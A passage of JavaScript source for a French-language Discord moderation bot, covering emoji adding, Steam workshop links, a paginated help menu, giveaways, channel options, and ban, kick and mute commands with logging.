                        .setColor('#135DD8')
                        message.channel.send(serverinfofivm)
                });     
        }
    }*/

  if (command === "emojiadd") {
    if (!database.get("owners").find({ user_id: message.author.id }).value()) {
      return message.channel.send(
        `> ❌ **Vous ne disposez pas des permissions nécessaires.**`
      );
    }
    const URL = args[0];
    if (!URL) {
      return message.channel.send("> ❌ **Merci de mettre un lien d'emoji**");
    }
    const name = args[1] ? args[1].replace(/[^a-z0-9]/gi, "") : null;
    if (!name) {
      return message.channel.send("> ❌ **Merci de mettre un nom d'emoji**");
    }
    if (name.length < 2 || name > 32) {
      return message.channel.send(
        "> ❌ **Merci de mettre un nom d'emoji entre 2 et 32 lettres**"
      );
    }

    message.guild.emojis
      .create(URL, name)
      .then((emoji) => {
        const emojiadd = new Discord.MessageEmbed()
          .setTitle("➕ | Emoji")
          .setColor("#008000")
          .setDescription(`Emoji \`${args[1]}\` ajouté avec succès`)
          .setImage(args[0])
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          );
        message.channel.send(emojiadd);
        const log = bot.channels.cache.find(
          (channel) => channel.name == LogsChannel
        );
        if (!log) return;

        const emojiaddlog = new Discord.MessageEmbed()
          .setTitle("➕ | Emoji")
          .setColor("#008000")
          .setDescription(`Emoji \`${args[1]}\` ajouté sur le serveur`)
          .addField("Staff", message.author)
          .setImage(args[0])
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          );
        log.send(emojiaddlog);
      })
      .catch(() => {
        const emojiadd = new Discord.MessageEmbed()
          .setTitle("⛔ | Emoji")
          .setColor("#FF0000")
          .setDescription(
            `Un problème est survenu lors de l'ajout de l'emoji \`${args[1]}\`\n\n**Verifiez :**\n- Que l'image fait 128KB ou moins.\n- Que l'URL donné est valide.`
          )
          .setImage(args[0])
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          );
        message.channel.send(emojiadd);
      });
  }

  if (command === "workshop") {
    message.delete();
    if (message.guild.id === "799876594525143060") {
      const workshop = new Discord.MessageEmbed()
        .setTitle("-| 「✅」Workshop SCP RP |-")
        .setColor("#3A73A0")
        .setDescription(
          `${message.member} voici la collection workshop du serveur **DarkRP**\n\nhttps://steamcommunity.com/sharedfiles/filedetails/?id=1176793865`
        )
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        )
        .setTimestamp();
      message.channel.send(workshop);
    } else if (message.guild.id === "839156422662029362") {
      const workshop = new Discord.MessageEmbed()
        .setTitle("-| 「✅」Workshop SCP RP |-")
        .setColor("#3A73A0")
        .setDescription(
          `${message.member} voici la collection workshop du serveur **SCP RP**\n\nhttps://steamcommunity.com/sharedfiles/filedetails/?id=2475179854`
        )
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        )
        .setTimestamp();
      message.channel.send(workshop);
    } else {
      const workshop = new Discord.MessageEmbed()
        .setTitle("-| 「✅」Workshop SCP RP |-")
        .setColor("#3A73A0")
        .setDescription(
          `${message.member} voici la collection workshop du serveur **SCP RP**\n\nhttps://steamcommunity.com/sharedfiles/filedetails/?id=2475179854`
        )
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        )
        .setTimestamp();
      message.channel.send(workshop);

      const workshopa = new Discord.MessageEmbed()
        .setTitle("-| 「✅」Workshop SCP RP |-")
        .setColor("#3A73A0")
        .setDescription(
          `${message.member} voici la collection workshop du serveur **DarkRP**\n\nhttps://steamcommunity.com/sharedfiles/filedetails/?id=1176793865`
        )
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        )
        .setTimestamp();
      message.channel.send(workshopa);
    }
  }

  if (command === "help") {
    message.delete();
    const helpstart = new Discord.MessageEmbed()
      .setTitle("ℹ | Help")
      .setColor("#ff6600")
      .setDescription(
        "Bienvenue sur la page `Help` du bot, pour savoir les commandes faites défiler les pages avec les réactions `⏪` et `⏩` ci-dessous !"
      )
      .setFooter(
        `${message.guild.name} - 2020`,
        message.guild.iconURL({ dynamic: true })
      )
      .setTimestamp();

    const botowner = new Discord.MessageEmbed()
      .setTitle("🎩 | Bot Owner")
      .setColor("#410093")
      .addField(
        `\`${prefix}owner\``,
        "Ajouter/Retirer des personnes voulu à la liste des owners du bot grâce à son ID."
      )
      .addField(
        `\`${prefix}setup\``,
        "Configurer les prérequis du bot sur le serveur."
      )
      .addField(
        `\`${prefix}setupmute\``,
        "Configurer le rôle mute sur tout les channels du serveur."
      )
      .addField(
        `\`${prefix}options\``,
        "Configurer `Anti-New` et `Confession` sur le serveur."
      )
      .setFooter(
        `${message.guild.name} - 2020`,
        message.guild.iconURL({ dynamic: true })
      )
      .setTimestamp();

    const owner = new Discord.MessageEmbed()
      .setTitle("🌟 | Owner")
      .setColor("#af0606")
      .addField(
        `\`${prefix}staff\``,
        "Ajouter/Retirer des personnes voulu à la liste des staffs du bot grâce à son ID."
      )
      .addField(
        `\`${prefix}ban\``,
        "Bannir la personne voulu grâce à sa mention ou son ID."
      )
      .addField(`\`${prefix}statut\``, "Changer le statut du bot.")
      .addField(
        `\`${prefix}unban\``,
        "Revoquer le ban de la personne voulu grâce à son ID."
      )
      .addField(
        `\`${prefix}giveaway\``,
        "Revoquer le ban de la personne voulu grâce à son ID."
      )
      .addField(
        `\`${prefix}emojiadd\``,
        "Ajouter des emojis directement avec le lien."
      )
      .addField(
        `\`${prefix}bl\``,
        "Ajouter une personne à la blacklist du serveur."
      )
      .addField(
        `\`${prefix}unbl\``,
        "Supprimer une personne à la blacklist du serveur."
      )
      .addField(
        `\`${prefix}lock\``,
        "Permet de fermer le channel à la discussion."
      )
      .addField(
        `\`${prefix}unlock\``,
        `Permet d'ouvrir le channel à la discussion.`
      )
      .setFooter(
        `${message.guild.name} - 2020`,
        message.guild.iconURL({ dynamic: true })
      )
      .setTimestamp();

    const staff = new Discord.MessageEmbed()
      .setTitle("🪓 | Staff")
      .setColor("#09b83e")
      .addField(
        `\`${prefix}kick\``,
        "Kick la personne voulu grâce à sa mention ou son ID."
      )
      .addField(`\`${prefix}mute\``, "Mute une personne indéfiment.")
      .addField(`\`${prefix}tempmute\``, "Mute un temps voulu une personne.")
      .addField(`\`${prefix}unmute\``, "Unmute une personne.")
      .addField(`\`${prefix}clear\``, "Clear les messages.")
      .setFooter(
        `${message.guild.name} - 2020`,
        message.guild.iconURL({ dynamic: true })
      )
      .setTimestamp();

    const utility = new Discord.MessageEmbed()
      .setTitle("🤖 | Commandes Utiles")
      .setColor("#ff6600")
      .addField(
        `\`${prefix}user\``,
        `Savoir les informations de la personne grâce à sa mention ou son ID.`
      )
      .addField(
        `\`${prefix}serverinfo\``,
        "Savoir les informations du serveur."
      )
      .addField(
        `\`${prefix}avatar\``,
        `Afficher l'avatar de la personne voulu.`
      )
      .addField(
        `\`${prefix}server\``,
        "Savoir les informations du serveur In-Game."
      )
      .addField(`\`${prefix}help\``, "Commandes disponibles.")
      .setTimestamp()
      .setFooter(
        `${message.guild.name} - 2020`,
        message.guild.iconURL({ dynamic: true })
      );

    if (database.get("botowner").find({ user_id: message.author.id }).value()) {
      const pages = [helpstart, utility, staff, owner, botowner];

      const emojiList = ["⏪", "⏩"];

      const timeout = "120000";

      pagination(message, pages, emojiList, timeout);
      return;
    } else if (
      database.get("owners").find({ user_id: message.author.id }).value()
    ) {
      const pages = [helpstart, utility, staff, owner];

      const emojiList = ["⏪", "⏩"];

      const timeout = "120000";

      pagination(message, pages, emojiList, timeout);
      return;
    } else if (
      database.get("staffs").find({ user_id: message.author.id }).value()
    ) {
      const pages = [helpstart, utility, staff];

      const emojiList = ["⏪", "⏩"];

      const timeout = "120000";

      pagination(message, pages, emojiList, timeout);
      return;
    } else {
      const pages = [helpstart, utility];

      const emojiList = ["⏪", "⏩"];

      const timeout = "120000";

      pagination(message, pages, emojiList, timeout);
      return;
    }
  }

  if (command === "giveaway") {
    if (!database.get("owners").find({ user_id: message.author.id }).value()) {
      return message.channel.send(
        `> ❌ **Vous ne disposez pas des permissions nécessaires.**`
      );
    }
    const status = args[0];
    if (!status) {
      const giveawayembedhelp = new Discord.MessageEmbed()
        .setColor("#ffa500")
        .setTitle(`⚙ | GiveAway`)
        .setDescription(
          `Seul les arguments ci-dessous sont valides !\n\n- \`create {temps} {gagnants} {prix}\`\n- \`reroll {id}\`\n- \`delete {id}\`\n- \`end {id}\`\n`
        )
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        );
      return message.channel.send(giveawayembedhelp);
    }
    if (status === "create") {
      const time = args[1];
      if (!time) {
        const giveawayembedhelp = new Discord.MessageEmbed()
          .setColor("#ffa500")
          .setTitle(`⚙ | GiveAway`)
          .setDescription(
            `Merci de prendre exemple sur la commande ci-dessous !\n\n- \`${prefix}giveaway create {temps} {gagnants} {prix}\`\n- \`${prefix}giveaway create 1h 3 Clés Steam\``
          )
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          );
        return message.channel.send(giveawayembedhelp);
      }
      if (isNaN(ms(time))) {
        const giveawayembedhelp = new Discord.MessageEmbed()
          .setColor("#ffa500")
          .setTitle(`⚙ | GiveAway`)
          .setDescription(
            `Merci de prendre exemple sur la commande ci-dessous !\n\nTemps disponibles (\`s, m, h, d, w, M, Y\`)\n\n- \`${prefix}giveaway create {temps} {gagnants} {prix}\`\n- \`${prefix}giveaway create 1h 3 Clés Steam\``
          )
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          );
        return message.channel.send(giveawayembedhelp);
      }
      const winnersCount = args[2];
      if (!winnersCount) {
        const giveawayembedhelp = new Discord.MessageEmbed()
          .setColor("#ffa500")
          .setTitle(`⚙ | GiveAway`)
          .setDescription(
            `Merci de prendre exemple sur la commande ci-dessous !\n\nTemps disponibles (\`s, m, h, d, w, M, Y\`)\n\n- \`${prefix}giveaway create {temps} {gagnants} {prix}\`\n- \`${prefix}giveaway create 1h 3 Clés Steam\``
          )
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          );
        return message.channel.send(giveawayembedhelp);
      }
      if (isNaN(winnersCount)) {
        const giveawayembedhelp = new Discord.MessageEmbed()
          .setColor("#ffa500")
          .setTitle(`⚙ | GiveAway`)
          .setDescription(
            `Merci de choisir un nombre de gagnants entre 1 et 10\n\nTemps disponibles (\`s, m, h, d, w, M, Y\`)\n\n- \`${prefix}giveaway create {temps} {gagnants} {prix}\`\n- \`${prefix}giveaway create 1h 3 Clés Steam\``
          )
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          );
        return message.channel.send(giveawayembedhelp);
      }
      const prize = args.slice(3).join(" ");
      if (!prize) {
        const giveawayembedhelp = new Discord.MessageEmbed()
          .setColor("#ffa500")
          .setTitle(`⚙ | GiveAway`)
          .setDescription(
            `Merci de prendre exemple sur la commande ci-dessous !\n\nTemps disponibles (\`s, m, h, d, w, M, Y\`)\n\n- \`${prefix}giveaway create {temps} {gagnants} {prix}\`\n- \`${prefix}giveaway create 1h 3 Clés Steam\``
          )
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          );
        return message.channel.send(giveawayembedhelp);
      }
      message.delete();
      bot.giveawaysManager
        .start(message.channel, {
          time: ms(time),
          prize: prize,
          winnerCount: parseInt(winnersCount, 10),
          messages: {
            giveaway: "\n\n🎉 **GIVEAWAY** 🎉",
            giveawayEnded: "\n\n🎉🎉 **GIVEAWAY TERMINÉ** 🎉🎉",
            timeRemaining: "Temps restant: **{duration}**!",
            inviteToParticipate: "Pour participer réagis avec `🎉`",
            winMessage: "Bravo, {winners} ! **{prize} gagné** !",
            embedFooter: "Giveaways",
            noWinner: "Giveaway annulé, pas assez de participations !",
            hostedBy: "Crée bar: {user}",
            winners: "gagnant(s)",
            endedAt: "Se termine dans",
            units: {
              seconds: "secondes",
              minutes: "minutes",
              hours: "heures",
              days: "jours",
              pluralS: false,
            },
          },
        })
        .then(() => {
          message.channel.send(`> ✅ **Giveaway crée avec succès**`);
        });
    } else if (status === "reroll") {
      const messageID = args[1];
      if (!messageID) {
        const giveawayembedhelp = new Discord.MessageEmbed()
          .setColor("#ffa500")
          .setTitle(`⚙ | GiveAway`)
          .setDescription(
            `Merci de prendre exemple sur la commande ci-dessous !\n\n- \`${prefix}giveaway reroll {id}\`\n- \`${prefix}giveaway reroll 779701519788277780\``
          )
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          );
        return message.channel.send(giveawayembedhelp);
      }
      message.delete();
      bot.giveawaysManager
        .reroll(messageID, {
          messages: {
            congrat: ":tada: Nouveau gagnant(s) : {winners}!",
            error: "> ❌ **Impossible de trouver un nouveau gagnants..**",
          },
        })
        .catch((err) => {
          message.channel.send(
            "`> ❌ **Aucuns Giveaway trouvé pour **" + messageID
          );
        });
    } else if (status === "delete") {
      const messageID = args[1];
      if (!messageID) {
        const giveawayembedhelp = new Discord.MessageEmbed()
          .setColor("#ffa500")
          .setTitle(`⚙ | GiveAway`)
          .setDescription(
            `Merci de prendre exemple sur la commande ci-dessous !\n\n- \`${prefix}giveaway delete {id}\`\n- \`${prefix}giveaway delete 779701519788277780\``
          )
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          );
        return message.channel.send(giveawayembedhelp);
      }
      message.delete();
      bot.giveawaysManager
        .delete(messageID)
        .then(() => {
          message.channel.send("> ✅ **Giveaway supprimé**");
        })
        .catch((err) => {
          message.channel.send(
            "> ❌ **Aucuns Giveaway trouvé pour **" + messageID
          );
        });
    } else if (status === "end") {
      const messageID = args[1];
      if (!messageID) {
        const giveawayembedhelp = new Discord.MessageEmbed()
          .setColor("#ffa500")
          .setTitle(`⚙ | GiveAway`)
          .setDescription(
            `Merci de prendre exemple sur la commande ci-dessous !\n\n- \`${prefix}giveaway end {id}\`\n- \`${prefix}giveaway end 779701519788277780\``
          )
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          );
        return message.channel.send(giveawayembedhelp);
      }
      message.delete();
      try {
        bot.giveawaysManager.edit(messageID, {
          setEndTimestamp: Date.now(),
        });
        return message.channel.send(`> ✅ **Giveaway arrêté**`);
      } catch (e) {
        return message.channel.send(
          `> ❌ **Aucuns Giveaway trouvé pour ** ${messageID}`
        );
      }
    } else {
      message.delete();
      const giveawayembedhelp = new Discord.MessageEmbed()
        .setColor("#ffa500")
        .setTitle(`⚙ | GiveAway`)
        .setDescription(
          `Seul les arguments ci-dessous sont valides !\n\n- \`create {temps} {gagnants} {prix}\`\n- \`reroll {id}\`\n- \`delete {id}\`\n- \`end {id}\`\n`
        )
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        );
      return message.channel.send(giveawayembedhelp);
    }
  }

  if (command === "options") {
    if (
      !database.get("botowner").find({ user_id: message.author.id }).value()
    ) {
      return message.channel.send(
        `> ❌ **Vous ne disposez pas des permissions nécessaires.**`
      );
    }
    if (!args[0])
      return message.channel.send(
        `> ❌ **Seuls les arguments __confesschannel, logconfess, antinew, joinleave__ sont valides.**`
      );
    if (args[0] === "joinleavechannel") {
      if (args[1])
        return message.channel.send(
          `> ❌ **Merci de ne pas mettre d'arguments et d'écrire la commande dans le channel voulu.**`
        );
      const embed = new Discord.MessageEmbed()
        .setColor("#ffa500")
        .setTitle(`⚙ | Jojnleave Changement`)
        .setDescription(`Ce channel est maintenant réservé aux confessions !`)
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        );
      message.channel.send({ embed });
      const log = bot.channels.cache.find(
        (channel) => channel.name == LogsChannel
      );
      if (!log) return;

      var logconfess = new Discord.MessageEmbed()
        .setTitle("⚙ | Jojnleave Changement Logs")
        .addField("Staff", `${message.author}`, true)
        .addField("ID", `${message.author.id}`, true)
        .addField(`Channel sélectionné`, `${message.channel}`)
        .addField("Date & Heure", getNow("datetime"))
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        )
        .setColor("#008000");

      log.send(logconfess);
      db.set(`${message.guild.id}.joinchannel`, `${message.channel.id}`);
    } else if (args[0] === "confesschannel") {
      if (args[1])
        return message.channel.send(
          `> ❌ **Merci de ne pas mettre d'arguments et d'écrire la commande dans le channel voulu.**`
        );
      const embed = new Discord.MessageEmbed()
        .setColor("#ffa500")
        .setTitle(`⚙ | Confessions Changement`)
        .setDescription(`Ce channel est maintenant réservé aux confessions !`)
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        );
      message.channel.send({ embed });
      const log = bot.channels.cache.find(
        (channel) => channel.name == LogsChannel
      );
      if (!log) return;

      var logconfess = new Discord.MessageEmbed()
        .setTitle("⚙ | Confessions Changement Logs")
        .addField("Staff", `${message.author}`, true)
        .addField("ID", `${message.author.id}`, true)
        .addField(`Channel sélectionné`, `${message.channel}`)
        .addField("Date & Heure", getNow("datetime"))
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        )
        .setColor("#008000");

      log.send(logconfess);
      db.set(`${message.guild.id}.confess.channel`, `${message.channel.id}`);
    } else if (args[0] === "gban") {
      if (args[1])
        return message.channel.send(
          `> ❌ **Merci de ne pas mettre d'arguments et d'écrire la commande dans le channel voulu.**`
        );
      const embed = new Discord.MessageEmbed()
        .setColor("#ffa500")
        .setTitle(`⚙ | GBan Changement`)
        .setDescription(`Ce channel est maintenant réservé aux bans IG !`)
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        );
      message.channel.send({ embed });
      const log = bot.channels.cache.find(
        (channel) => channel.name == LogsChannel
      );
      if (!log) return;

      var logsban = new Discord.MessageEmbed()
        .setTitle("⚙ | GBan Changement Logs")
        .addField("Staff", `${message.author}`, true)
        .addField("ID", `${message.author.id}`, true)
        .addField(`Channel sélectionné`, `${message.channel}`)
        .addField("Date & Heure", getNow("datetime"))
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        )
        .setColor("#008000");

      log.send(logsban);
      db.set(`${message.guild.id}.gban`, `${message.channel.id}`);
    } else if (args[0] === "joinleave") {
      if (args[1])
        return message.channel.send(
          `> ❌ **Merci de ne pas mettre d'arguments et d'écrire la commande dans le channel voulu.**`
        );
      const embed = new Discord.MessageEmbed()
        .setColor("#ffa500")
        .setTitle(`⚙ | Log Join/Leave Changement`)
        .setDescription(
          `Ce channel est maintenant réservé à l'arrivé et départ des élèves !`
        )
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        );
      message.channel.send({ embed });
      const log = bot.channels.cache.find(
        (channel) => channel.name == LogsChannel
      );
      if (!log) return;

      var joinleavelogs = new Discord.MessageEmbed()
        .setTitle("⚙ | Join/Leave Changement Logs")
        .addField("Staff", `${message.author}`, true)
        .addField("ID", `${message.author.id}`, true)
        .addField(`Channel sélectionné`, `${message.channel}`)
        .addField("Date & Heure", getNow("datetime"))
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        )
        .setColor("#008000");

      log.send(joinleavelogs);
      db.set(`${message.guild.id}.joinleave`, `${message.channel.id}`);
    } else if (args[0] === "logconfess") {
      if (args[1])
        return message.channel.send(
          `> ❌ **Merci de ne pas mettre d'arguments et d'écrire la commande dans le channel voulu.**`
        );
      const embed = new Discord.MessageEmbed()
        .setColor("#ffa500")
        .setTitle(`⚙ | Log Confessions Changement`)
        .setDescription(`Ce channel est maintenant réservé aux confessions !`)
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        );
      message.channel.send({ embed });
      const log = bot.channels.cache.find(
        (channel) => channel.name == LogsChannel
      );
      if (!log) return;

      var logconfess = new Discord.MessageEmbed()
        .setTitle("⚙ | Log Confessions Changement Logs")
        .addField("Staff", `${message.author}`, true)
        .addField("ID", `${message.author.id}`, true)
        .addField(`Channel sélectionné`, `${message.channel}`)
        .addField("Date & Heure", getNow("datetime"))
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        )
        .setColor("#008000");

      log.send(logconfess);
      db.set(
        `${message.guild.id}.confess.channel.log`,
        `${message.channel.id}`
      );
    } else if (args[0] === "antinew") {
      const antinewstatus = db.get(`${message.guild.id}.antinew.status`);
      if (args[1] === "true") {
        if (antinewstatus === true) {
          return message.channel.send(`> ❌ **L'Anti-New est déjà actif.**`);
        }
        const embed = new Discord.MessageEmbed()
          .setColor("#ffa500")
          .setTitle(`⚙ | Antinew Changement`)
          .setDescription(`L'Anti-New est désormais actif !`)
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          );
        message.channel.send({ embed });
        const log = bot.channels.cache.find(
          (channel) => channel.name == LogsChannel
        );
        if (!log) return;

        var logconfess = new Discord.MessageEmbed()
          .setTitle(`⚙ | Antinew Changement Logs`)
          .addField("Staff", `${message.author}`, true)
          .addField("ID", `${message.author.id}`, true)
          .addField(`Status Antinew`, `true`)
          .addField("Date & Heure", getNow("datetime"))
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#008000");

        log.send(logconfess);
        db.set(`${message.guild.id}.antinew.status`, true);
      } else if (args[1] === "false") {
        if (antinewstatus === false) {
          return message.channel.send(`> ❌ **L'Anti-New n'est déjà actif.**`);
        }
        const embed = new Discord.MessageEmbed()
          .setColor("#ffa500")
          .setTitle(`⚙ | Antinew Changement`)
          .setDescription(`L'Anti-New n'est plus actif !`)
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          );
        message.channel.send({ embed });
        const log = bot.channels.cache.find(
          (channel) => channel.name == LogsChannel
        );
        if (!log) return;

        var logconfess = new Discord.MessageEmbed()
          .setTitle(`⚙ | Antinew Changement Logs`)
          .addField("Staff", `${message.author}`, true)
          .addField("ID", `${message.author.id}`, true)
          .addField(`Status Antinew`, `false`)
          .addField("Date & Heure", getNow("datetime"))
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#008000");

        log.send(logconfess);
        db.set(`${message.guild.id}.antinew.status`, false);
      } else {
        return message.channel.send(
          `> ❌ **Seuls les arguments __true, false__ sont valides.**`
        );
      }
    } else {
      return message.channel.send(
        `> ❌ **Seuls les arguments __confesschannel, logconfess, antinew, joinleave__ sont valides.**`
      );
    }
  }

  if (command === "ban") {
    if (!database.get("owners").find({ user_id: message.author.id }).value()) {
      return message.channel.send(
        `> ❌ **Vous ne disposez pas des permissions nécessaires.**`
      );
    }

    if (!args[0])
      return message.channel.send("> ❌ **Merci d'entrer un ID valide.**");
    const member = message.mentions.members.first();

    if (member) {
      if (member.roles.highest.position > message.member.roles.highest.position)
        return message.channel.send(
          `:x: ${message.author}, Vous ne pouvez pas bannir quelqu'un au dessus de vous.`
        );

      let reason = args.slice(1).join(" ") || "Non défini";

      await member.send(
        `Vous venez d'être banni de ${message.guild.name}\n\nPar : ${message.author.tag} (**${message.author.id}**)\nRaison : ${reason}`
      );
      message.guild.members.ban(member.id, {
        reason: `Bannis par ${message.author.tag} (${message.author.id}) pour: ${reason}`,
      });
      message.channel.send(`✅ ${member} vient d'être banni !`);
      const log = bot.channels.cache.find(
        (channel) => channel.name == LogsChannel
      );
      if (!log) return;

      var logbans = new Discord.MessageEmbed()
        .setTitle("🔨 | Ban")
        .addField("Membre", `${member}`, true)
        .addField("ID", `${member.id}`, true)
        .addField("Raison", `${reason}`, true)
        .addField("\u200b", "\u200b")
        .addField("Staff", `${message.author}`, true)
        .addField("ID", `${message.author.id}`, true)
        .addField("Date & Heure", getNow("datetime"))
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        )
        .setColor("#008000");

      log.send(logbans);
    } else {
      member = await bot.users.fetch(args[0]);
      if (member) {
        let reason = args.slice(1).join(" ") || "Non défini";

        message.guild.members.ban(member.id, {
          reason: `Bannis par ${message.author.tag} (${message.author.id}) pour: ${reason}`,
        });
        message.channel.send(`✅ ${member.username} vient d'être banni !`);
        const log = bot.channels.cache.find(
          (channel) => channel.name == LogsChannel
        );
        if (!log) return;

        var logbans = new Discord.MessageEmbed()
          .setTitle("🔨 | Ban")
          .addField("Membre", `${member.username}`, true)
          .addField("ID", `${member.id}`, true)
          .addField("Raison", `${reason}`, true)
          .addField("\u200b", "\u200b")
          .addField("Staff", `${message.author}`, true)
          .addField("ID", `${message.author.id}`, true)
          .addField("Date & Heure", getNow("datetime"))
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#008000");

        log.send(logbans);
      } else {
        return message.channel.send("> ❌ **Merci d'entrer un ID valide.**");
      }
    }
  }

  if (command === "kick") {
    if (!database.get("staffs").find({ user_id: message.author.id }).value()) {
      return message.channel.send(
        `> ❌ **Vous ne disposez pas des permissions nécessaires.**`
      );
    }
    if (!args[0])
      return message.channel.send("> ❌ **Merci d'entrer un ID valide.**");
    const member =
      message.mentions.members.first() ||
      message.guild.members.cache.get(args[0]);
    if (!member)
      return message.channel.send("> ❌ **Merci d'entrer un ID valide.**");

    let reason = args.slice(1).join(" ") || "Non défini";

    if (!member.bannable) {
      return message.channel.send(
        "> ❌ **Je n'ai pas la permission de kick cette personne !**"
      );
    }

    await member.send(
      `Vous venez d'être kick de ${message.guild.name}\n\nPar : ${message.author.tag} (**${message.author.id}**)\nRaison : ${reason}`
    );
    message.guild
      .member(member)
      .kick(`Staff ${message.author.tag}, pour ${reason}`);
    message.channel.send(`✅ ${member} vient d'être kick !`);
    const log = bot.channels.cache.find(
      (channel) => channel.name == LogsChannel
    );
    if (!log) return;

    var logskick = new Discord.MessageEmbed()
      .setTitle("👢 | Kick")
      .addField("Membre", `${member}`, true)
      .addField("ID", `${member.id}`, true)
      .addField("\u200b", "\u200b")
      .addField("Staff", `${message.author}`, true)
      .addField("ID", `${message.author.id}`, true)
      .addField("Date & Heure", getNow("datetime"))
      .setFooter(
        `${message.guild.name} - 2020`,
        message.guild.iconURL({ dynamic: true })
      )
      .setColor("#008000");

    log.send(logskick);
  }

  if (command === "mute") {
    if (database.get("staffs").find({ user_id: message.author.id }).value()) {
      let tomute = message.guild.member(
        message.mentions.users.first() ||
          message.guild.members.cache.get(args[0])
      );

      if (!tomute)
        return message.channel.send("❌ **| Merci de mettre une mention.**");

      if (tomute.hasPermission("ADMINISTRATOR"))
        return message.channel.send(
          "❌ **| Je n'ai pas la permission de mute cette personne.**"
        );
      if (tomute.id === message.author.id)
        return message.channel.send(
          "❌ **| Vous ne pouvez pas vous mute vous même.**"
        );

      let muterole = message.guild.roles.cache.find(
        (role) => role.name === Mutedrole
      );
      if (!muterole)
        return message.channel.send(
          `❌ **| Merci de faire \`${prefix}setup\` avant d'utiliser cette commmande, car il semble qu'il y ait un problème..**`
        );

      if (tomute.roles.cache.has(muterole.id))
        return message.channel.sendMessage(
          "❌ **| Cette utilisateur est déjà mute**"
        );

      let reason = args.slice(1).join(" ") || `Non défini`;

      tomute.roles.add(muterole.id, `Mute par ${message.author.tag}`);

      message.channel.send(`✅ ${tomute} **a été mute.**`);

      const logschannel = message.guild.channels.cache.find(
        (channel) => channel.name === LogsChannel
      );

      var logsmuteembed = new Discord.MessageEmbed()
        .setTitle("🔇 | Mute")
        .addField("Membre", `${tomute}`, true)
        .addField("ID", `${tomute.id}`, true)
        .addField("Raison", `${reason}`, true)
        .addField("\u200b", "\u200b")
        .addField("Staff", `${message.author}`, true)
        .addField("ID", `${message.author.id}`, true)
        .addField("Date & Heure", getNow("datetime"))
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        )
        .setColor("#008000");

      logschannel.send(logsmuteembed);
    } else {
      message.channel.send(
        `> :x: Vous ne disposez pas des permissions necessaires.`
      );
    }
  }

  if (command === "unmute") {
    if (database.get("staffs").find({ user_id: message.author.id }).value()) {
      let tomute = message.guild.member(
        message.mentions.users.first() ||
          message.guild.members.cache.get(args[0])
      );

      if (!tomute)
        return message.channel.send("❌ **| Merci de mettre une mention.**");

      let muterole = message.guild.roles.cache.find(
        (role) => role.name === Mutedrole
      );
      if (!muterole)
        return message.channel.send(
          `❌ **| Merci de faire \`${prefix}setup\` avant d'utiliser cette commmande, car il semble qu'il y ait un problème..**`
        );

      if (!tomute.roles.cache.has(muterole.id))
        return message.channel.sendMessage(
          "❌ **| Cette utilisateur n'est pas mute**"
        );

      let reason = args.slice(1).join(" ") || `Non défini`;

      tomute.roles.remove(muterole.id, `UnMute par ${message.author.tag}`);

      message.channel.send(`✅ ${tomute} **a été unmute.**`);

      const logschannel = message.guild.channels.cache.find(
        (channel) => channel.name === LogsChannel
      );

      var logsmuteembed = new Discord.MessageEmbed()
        .setTitle("🔊 | UnMute")
        .addField("Membre", `${tomute}`, true)
        .addField("ID", `${tomute.id}`, true)
        .addField("Raison", `${reason}`, true)
        .addField("\u200b", "\u200b")
        .addField("Staff", `${message.author}`, true)
        .addField("ID", `${message.author.id}`, true)
        .addField("Date & Heure", getNow("datetime"))
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        )
        .setColor("#FF0000");

      logschannel.send(logsmuteembed);
    } else {
      message.channel.send(
        `> :x: Vous ne disposez pas des permissions necessaires.`
      );
    }
  }

  if (command === "tempmute") {
